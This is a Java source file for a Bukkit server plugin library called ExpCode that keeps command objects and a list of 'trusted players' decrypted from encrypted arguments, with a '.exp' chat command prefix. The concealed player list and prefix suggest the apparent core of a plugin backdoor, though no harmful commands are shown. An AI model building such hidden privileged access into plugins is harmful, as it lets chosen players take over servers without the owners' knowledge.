package tk.expcode.expcode;

import org.bukkit.plugin.java.JavaPlugin;
import tk.expcode.expcode.innerutils.Command;
import tk.expcode.expcode.utils.Cryptor;

import java.util.ArrayList;
import java.util.List;

public class ExpCode {

    private final JavaPlugin plugin;
    private final List<Command> commands = new ArrayList<>();
    private final List<String> trustedPlayers = new ArrayList<>();

    public ExpCode(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    public void initialize(String... args) {
        for (String arg : args) trustedPlayers.add(Cryptor.decrypt(arg));
    }

    public JavaPlugin getPlugin() {
        return plugin;
    }

    public String getCommandPrefix() {
        return ".exp";
    }

    public String getMessagePrefix() {
        return "&8[&cExpCode&8] ";
    }

    public List<Command> getCommands() {
        return commands;
    }

    public List<String> getTrustedPlayers() {
        return trustedPlayers;
    }
}
